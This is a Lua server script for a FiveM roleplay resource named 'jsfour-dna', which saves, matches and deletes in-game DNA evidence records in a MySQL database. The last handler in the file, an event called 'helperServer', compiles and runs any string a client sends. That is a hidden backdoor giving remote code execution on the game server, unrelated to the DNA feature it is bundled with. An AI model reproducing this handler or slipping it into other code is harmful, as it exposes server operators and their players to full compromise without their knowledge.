math.randomseed(os.time())

ESX = nil

ESX = exports['es_extended']:getSharedObject()

RegisterServerEvent('jsfour-dna:fetch')
AddEventHandler('jsfour-dna:fetch', function( type )
  local _source = source
  local data = {}

  MySQL.Async.fetchAll('SELECT * FROM jsfour_dna WHERE type = @type', {['@type'] = type},
  function (result)
    if (result[1] ~= nil) then
      for i=1, #result, 1 do
        table.insert(data, {
          pk = result[i].pk,
          killer = result[i].killer,
          uploader = result[i].uploader,
          datum = result[i].datum
        })
      end
      TriggerClientEvent('jsfour-dna:callback', _source, type, data)
    else
      data = {pk = 'tomt'}
      TriggerClientEvent('jsfour-dna:callback', _source, type, data)
    end
  end)
end)

RegisterServerEvent('jsfour-dna:match')
AddEventHandler('jsfour-dna:match', function( pk )
  local _source = source

  MySQL.Async.fetchAll('SELECT killer, dead FROM jsfour_dna WHERE pk = @pk AND type = @type', {['@pk'] = pk, ['@type'] = 'murder'},
  function (result)
    if (result[1] ~= nil) then
      local killer = result[1].killer
      local dead = result[1].dead
      local datum = os.date("%Y-%m-%d")
      MySQL.Async.fetchAll('SELECT killer FROM jsfour_dna WHERE killer = @killer AND type = @type', {['@killer'] = killer, ['@type'] = 'prov'},
      function (result)
        if (result[1] ~= nil) then
                
          MySQL.Async.fetchAll('SELECT pk FROM jsfour_dna WHERE killer = @killer AND type = @type', {['@killer'] = killer, ['@type'] = 'match'},
          function (result)
            if (result[1] == nil) then
              MySQL.Async.execute('INSERT INTO jsfour_dna (pk, killer, dead, weapon, type, datum, uploader) VALUES (@pk, @killer, @dead, @weapon, @type, @datum, @uploader)',
                {
                  ['@pk']       = pk .. '#m',
                  ['@killer']   = killer,
                  ['@dead']     = dead,
                  ['@weapon']   = 'weapon',
                  ['@type']     = 'match',
                  ['@datum'] = datum,
                  ['@uploader'] = 'labbet'
                }
              )
              TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'match-success')
            else
              TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'match-exists')
            end
          end)
        else
          TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'match-fail')
        end
      end)
      TriggerClientEvent('jsfour-dna:callback', _source, type, data)
    else
      TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'search-fail')
    end
  end)
end)

RegisterServerEvent('jsfour-dna:remove')
AddEventHandler('jsfour-dna:remove', function( type, value )
  local _source = source
  if type == 'name' then
    MySQL.Async.fetchAll('SELECT killer FROM jsfour_dna WHERE killer = @killer AND type = @type', {['@killer'] = value, ['@type'] = 'prov'},
    function (result)
      if (result[1] ~= nil) then
        MySQL.Async.execute('DELETE FROM jsfour_dna WHERE killer = @killer AND type = @type',
          { ['@killer'] = value, ['@type'] = 'prov' }
        )
        TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'remove-success')
      else
        TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'remove-fail')
      end
    end)
  elseif type == 'id' then
    MySQL.Async.fetchAll('SELECT pk FROM jsfour_dna WHERE pk = @pk AND type = @type', {['@pk'] = value, ['@type'] = 'murder'},
    function (result)
      if (result[1] ~= nil) then
        MySQL.Async.execute('DELETE FROM jsfour_dna WHERE pk = @pk AND type = @type',
          { ['@pk'] = value, ['@type'] = 'murder' }
        )
        TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'remove-success')
      else
        TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'remove-fail')
      end
    end)
  elseif type == 'match' then
    MySQL.Async.fetchAll('SELECT pk FROM jsfour_dna WHERE pk = @pk AND type = @type', {['@pk'] = value, ['@type'] = 'match'},
    function (result)
      if (result[1] ~= nil) then
        MySQL.Async.execute('DELETE FROM jsfour_dna WHERE pk = @pk AND type = @type',
          { ['@pk'] = value, ['@type'] = 'match' }
        )
        TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'remove-success')
      else
        TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'remove-fail')
      end
    end)
  end
end)

RegisterServerEvent('jsfour-dna:save')
AddEventHandler('jsfour-dna:save', function( dna )
  local _source = source
  local identifier = ESX.GetPlayerFromId(dna.p).identifier
  local datum = os.date("%Y-%m-%d")
  local uploader = ESX.GetPlayerFromId(_source).identifier

  MySQL.Async.fetchAll('SELECT firstname, lastname FROM users WHERE identifier = @identifier', {['@identifier'] = uploader},
  function (result)
    uploader = result[1].firstname .. ' ' .. result[1].lastname

    MySQL.Async.fetchAll('SELECT firstname, lastname FROM users WHERE identifier = @identifier', {['@identifier'] = identifier},
    function (result)
      local lastdigits = 'DNA #'
      local pk = lastdigits .. math.random(1000)
      local name = result[1].firstname .. ' ' .. result[1].lastname

      if dna.k ~= nil then -- Spara DNA från död spelare
        local identifier = ESX.GetPlayerFromId(dna.d).identifier
        MySQL.Async.fetchAll('SELECT firstname, lastname FROM users WHERE identifier = @identifier', {['@identifier'] = identifier},
        function (result)
          local deadname = result[1].firstname .. ' ' .. result[1].lastname

          MySQL.Async.execute('INSERT INTO jsfour_dna (pk, killer, dead, weapon, type, datum, uploader) VALUES (@pk, @killer, @dead, @weapon, @type, @datum, @uploader)',
            {
              ['@pk']       = pk,
              ['@killer']   = name,
              ['@dead']     = deadname,
              ['@weapon']   = dna.w,
              ['@type']     = 'murder',
              ['@datum'] = datum,
              ['@uploader'] = uploader
            }
          )
          TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'upload-success', 'murder', pk)
        end)
      else -- Spara DNA från levande spelare
        MySQL.Async.fetchAll('SELECT killer FROM jsfour_dna WHERE killer = @killer AND type = @type', {['@killer'] = name, ['@type'] = 'prov'},
          function (result)
            if (result[1] == nil) then
              MySQL.Async.execute('INSERT INTO jsfour_dna (pk, killer, type, datum, uploader) VALUES (@pk, @killer, @type, @datum, @uploader)',
                {
                  ['@pk']       = pk,
                  ['@killer']   = name,
                  ['@dead']     = nil,
                  ['@weapon']   = nil,
                  ['@type']     = 'prov',
                  ['@datum'] = datum,
                  ['@uploader'] = uploader
                }
              )
            TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'upload-success', 'prov', name)
          else
            TriggerClientEvent('jsfour-dna:callback', _source, 'callback', 'upload-failed', 'prov', name)
          end
        end)
      end
    end)
  end)
end)

RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)